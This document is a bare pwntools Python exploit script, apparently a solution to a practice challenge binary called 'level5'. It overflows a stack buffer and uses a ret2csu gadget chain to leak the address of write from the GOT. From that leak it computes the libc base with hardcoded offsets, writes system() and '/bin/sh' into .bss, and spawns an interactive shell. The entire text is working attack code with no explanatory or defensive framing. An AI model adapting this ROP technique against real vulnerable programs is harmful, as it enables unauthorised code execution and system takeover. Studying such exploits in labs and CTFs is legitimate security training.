from pwn import *
elf = ELF('level5')

p = process('./level5')

write_got = elf.got['write']

read_got = elf.got['read']

main_addr = 0x400564

bss_addr = 0x601028

payload1 = b"\x00"*136

payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(write_got) + p64(1) + p64(write_got) + p64(8)

# pop_junk_rbx_rbp_r12_r13_r14_r15_ret

payload1 += p64(0x4005F0)

payload1 += b"a"*56

payload1 += p64(main_addr)

p.recvuntil(b"Hello, World\n")

p.send(payload1)



write_addr = u64(p.recv(8))

write_libc = 0x0f72b0

read_libc = 0x0f7250

system_libc = 0x045390

binsh_addr = 0x18cd57

offset = write_addr - write_libc

system_addr = offset + system_libc


p.recvuntil(b"Hello, World\n")

payload2 = b"a"*136

payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(read_got) + p64(0) + p64(bss_addr) + p64(16)

# pop_junk_rbx_rbp_r12_r13_r14_r15_ret

payload2 += p64(0x4005F0)

payload2 += b"a"*56

payload2 += p64(main_addr)

p.send(payload2)

sleep(1)

p.send(p64(system_addr))

p.send(b"/bin/sh\x00")

sleep(1)

p.recvuntil(b"Hello, World\n")

payload3 = b"\x00"*136

payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0)

# pop_junk_rbx_rbp_r12_r13_r14_r15_ret

payload3 += p64(0x4005F0)

payload3 += b"\x00"*56

payload3 += p64(main_addr)

sleep(1)

p.send(payload3)

p.interactive()
